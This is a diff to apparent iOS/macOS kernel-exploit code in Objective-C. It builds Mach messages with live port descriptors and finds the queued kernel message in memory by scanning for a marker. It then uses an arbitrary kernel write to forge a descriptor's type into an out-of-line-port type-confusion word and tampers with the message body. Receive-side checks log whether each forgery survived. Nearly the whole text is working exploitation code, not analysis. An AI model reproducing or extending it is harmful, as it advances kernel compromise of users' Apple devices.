@@ -12,7 +12,7 @@
 #import <netinet/in.h>
 #import <fcntl.h>
 
-#define P113_BUILD @"p113-descforge-control-v1"
+#define P113_BUILD @"p113-descforge-control-v2"
 #define P113_MAGIC 0x50313333u   /* "P133" marker in body */
 #define P113_NDESC 16u
 
@@ -59,12 +59,16 @@ static mach_port_t p113_port(uint32_t idx, uint8_t *buf, uint32_t sz) {
     mach_msg_header_t *h = (mach_msg_header_t *)buf;
     mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
     b->msgh_descriptor_count = P113_NDESC;
-    uint32_t names[2] = {0};
+    /* v2 law: ALL descs are real live rights — fabricated names 0x1100+i fail
+       copyin outright (send kr!=0, kmsg never enters the kernel). Mirrors the
+       p073 sentPre victims (16 live port-kind descs). */
+    mach_port_t rcv[P113_NDESC];
     for (uint32_t i = 0; i < P113_NDESC; i++) {
-        mach_port_t p = MACH_PORT_NULL;
-        if (i < 2) { if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) return MACH_PORT_NULL; names[i] = p; }
+        rcv[i] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rcv[i]) != KERN_SUCCESS) return MACH_PORT_NULL;
+        if (mach_port_insert_right(mach_task_self(), rcv[i], rcv[i], MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) return MACH_PORT_NULL;
         mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * 12);
-        d->name = p ? p : (mach_port_t)(0x1100u + i);
+        d->name = rcv[i];   /* our own Send right — valid for COPY_SEND */
         d->pad1 = 0; d->disposition = MACH_MSG_TYPE_COPY_SEND; d->type = MACH_MSG_PORT_DESCRIPTOR;
     }
     memcpy(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12,
@@ -72,8 +76,8 @@ static mach_port_t p113_port(uint32_t idx, uint8_t *buf, uint32_t sz) {
     uint32_t tag = idx ^ P113_MAGIC;
     memcpy(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12 + 8, &tag, 4);
     h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-    h->msgh_size = sz; h->msgh_remote_port = names[0]; h->msgh_id = (int)P113_MAGIC;
-    return names[0];
+    h->msgh_size = sz; h->msgh_remote_port = rcv[0]; h->msgh_id = (int)P113_MAGIC;
+    return rcv[0];
 }
 
 static NSString *P113Ret(void);
@@ -98,7 +102,8 @@ static NSString *P113Ret(void) {
     if (!p113_krw()) { if (p113_fd>=0){close(p113_fd);p113_fd=-1;} return g_buf0(); }
     uint64_t kb = 0; if (g_kb(&kb)) p113_log(@"kbase=0x%llx", kb);
 
-    const uint32_t sz = 0x7FC;
+    /* exact complex size: hdr + body + 16 descs + body{marker5,pad3,tag4} */
+    const uint32_t sz = (uint32_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12 + 12);
     uint8_t *buf = calloc(1, sz);
     mach_port_t hold = p113_port(1, buf, sz);
     if (!hold) { p113_log(@"[-] kmsg build fail"); return ane_none(); }
@@ -120,36 +125,40 @@ static NSString *P113Ret(void) {
                 0x4000, (vm_address_t)(uintptr_t)rb, &vsz);
             if (vr != KERN_SUCCESS) continue;
             for (uint32_t i = 0; i + 16 <= 0x4000; i += 4)
-                if (memcmp(rb + i, "P133M", 5) == 0) { found = a + i - 8 - (5 + 8 - 12 * 0); found = a + i; break; }
+                if (memcmp(rb + i, "P133M", 5) == 0) { found = a + i; break; }
         }
         free(rb);
     }
     if (!found) { p113_log(@"[-] marker not found in scan band — widen or scan different band"); }
     else {
-        p113_log(@"[+] kmsg kdata @0x%llx (marker found) — desc block at +0x24, %u descs x12",
-                 found - (0x24 + 0), P113_NDESC);
-        /* forge desc0 {type@8,disp@10} = port-desc → OOL-port (1, COPY_SEND 0x11) */
-        uint64_t d0 = found - (0x24) ; /* desc[0] name starts at +0x24 */
-        d0 = found - 0x24 + 0;         /* keep explicit */
-        uint32_t zero[4] = {0, 0, 0, 0};
-        uint64_t tw = found + (0x2C - 0x24) + 0;  /* desc0.type rel marker: marker@+0x24+? recompute below */
-        p113_log(@"[*] writing forged desc words (control)...");
-        uint8_t forge[4] = { 0x01, 0x00, 0x11, 0x00 };   /* type=1 OOL-port? disp=0x11 */
-        (void)d0;(void)tw;(void)zero;
-        /* desc0 sits BEFORE the marker: marker at payload; descs at 0x24..  */
-        /* compute: body=0x24..: desc_i at 0x24+12i, marker at 0x24+192+0x8 */
-        uint64_t marker = found;
-        uint64_t desc0 = marker - (0x8 + 5) - 0; /* marker starts at 0x24+16*12+8 → desc0 = marker-200-8 */
-        desc0 = marker - (16u * 12u + 8u + 5u);
-        uint64_t taddr = desc0 + 8;
-        p113_log(@"[*] desc0@0x%llx type@0x%llx", desc0, taddr);
-        uint8_t orig[4];
-        if (g_rd(taddr, orig, 4) == 0)
-            p113_log(@"[*] desc0.type pre = %02x %02x %02x %02x (want %02x MACH_PORT_DESCRIPTOR)",
-                     orig[0], orig[1], orig[2], orig[3], 0x00 /*type byte*/);
+        p113_log(@"[+] kmsg kdata @0x%llx (marker 'P133M' found)", found);
+        /* v2: dump the kernel desc area BEFORE touching it — learns the live
+           encoding (12B wire stride vs 16B pointer stride) in one shot. */
+        {
+            uint8_t pre[0x100];
+            if (g_rd(found - 0x100, pre, 0x100) == 0)
+                for (uint32_t r2 = 0; r2 < 0x100; r2 += 32) {
+                    uint32_t *w = (uint32_t *)(pre + r2);
+                    p113_log(@"  pre[-0x%03x]: %08x %08x %08x %08x %08x %08x %08x %08x",
+                             (uint32_t)(0x100 - r2), w[0], w[1], w[2], w[3], w[4], w[5], w[6], w[7]);
+                }
+            else p113_log(@"[-] desc-area pre-read fail");
+        }
+        /* port-desc type word: 12B stride → desc0.type+8; 16B ptr stride →
+           desc4.type+8 — SAME VA (marker - 0xB8) under either encoding.
+           Pre-dump tells us which desc got hit. */
+        uint64_t tw = found - 0xB8;
+        uint8_t typepre[4];
+        if (g_rd(tw, typepre, 4) == 0)
+            p113_log(@"[*] type word pre @marker-0xB8 = %02x%02x%02x%02x (want 00 = PORT_DESCRIPTOR)",
+                     typepre[0], typepre[1], typepre[2], typepre[3]);
         uint8_t wd[4] = { 0x01, 0x00, 0x00, 0x00 };  /* type=1 (OOL port) */
-        if (g_wr(taddr, wd, 4) == 0) p113_log(@"[+] kwrite OK — desc0.type = 1 (OOL-port confusion word)");
-        else p113_log(@"[-] kwrite fail");
+        if (g_wr(tw, wd, 4) == 0) p113_log(@"[+] kwrite OK — port-desc type word → 1 (OOL-port confusion)");
+        else p113_log(@"[-] type kwrite fail");
+        /* second, encoding-independent control: the tag word (body, marker+8) */
+        uint32_t tagmagic = 0x44434241;
+        if (g_wr(found + 8, &tagmagic, 4) == 0) p113_log(@"[+] tag kwrite OK (body data-path control)");
+        else p113_log(@"[-] tag kwrite fail");
     }
     /* recv the victim: kernel validates descs on receive — forged type survives? */
     uint8_t rbuf[0x3000]; memset(rbuf, 0, sizeof rbuf);
@@ -158,13 +167,33 @@ static NSString *P113Ret(void) {
     p113_log(@"recv kr=%u size=%u", kr, rh->msgh_size);
     if (kr == 0) {
         mach_msg_body_t *rb2 = (mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t));
-        mach_msg_port_descriptor_t *d0r = (mach_msg_port_descriptor_t *)(rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
-        p113_log(@"[+] RECV OK count=%u desc0: {name=%#x pad=%#x disp=%#x type=%#x}",
-                 rb2->msgh_descriptor_count, *(uint32_t *)d0r, d0r->pad1, d0r->disposition, d0r->type);
-        p113_log(d0r->type == 1
-            ? @"[+++] CONVERSION BAR: body_forged CONFIRMED — desc type word 1 (OOL-port) RECEIVED"
-            : @"[-] desc type not 1 — validator rewrote or kwrite missed");
+        p113_log(@"[+] RECV OK count=%u", rb2->msgh_descriptor_count);
+        int type1 = -1;
+        for (uint32_t d = 0; d < P113_NDESC; d++) {
+            uint8_t *p = rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + d * 12;
+            uint16_t ty = *(uint16_t *)(p + 8);
+            if (d < 6) p113_log(@"  desc%u: name=%08x type=%02x disp=%02x",
+                                d, *(uint32_t *)p, ty, *(uint16_t *)(p + 10));
+            if (ty == 1 && type1 < 0) type1 = (int)d;
+        }
+        if (type1 >= 0)
+            p113_log(@"[+++] CONVERSION BAR: desc_type_forged CONFIRMED — desc%u.type=1 RECEIVED (OOL-port honored)", type1);
+        else
+            p113_log(@"[-] no type=1 in translated descs — validator normalized or write missed");
+    } else if (kr == MACH_RCV_BODY_ERROR) {
+        p113_log(@"[*] kr=MACH_RCV_BODY_ERROR — translated walk hit the forged desc (confusion REACHED, body torn)");
+    } else {
+        p113_log(@"[*] recv kr=%u (unexpected)", kr);
     }
+    /* encoding-independent data-path bar: marker in recv body + our kwrite tag */
+    for (uint32_t i = 0; i + 12 < sizeof rbuf; i += 4)
+        if (memcmp(rbuf + i, "P133M", 5) == 0) {
+            uint32_t tg = *(uint32_t *)(rbuf + i + 8);
+            p113_log(tg == 0x44434241
+                ? @"[+++] DATA PATH: body_forged CONFIRMED — tag 0x44434241 round-tripped kwrite→kmsg→recv"
+                : @"[-] marker received but tag not our kwrite value (kwrite missed the body word)");
+            break;
+        }
     return P113Ret();
 }
 
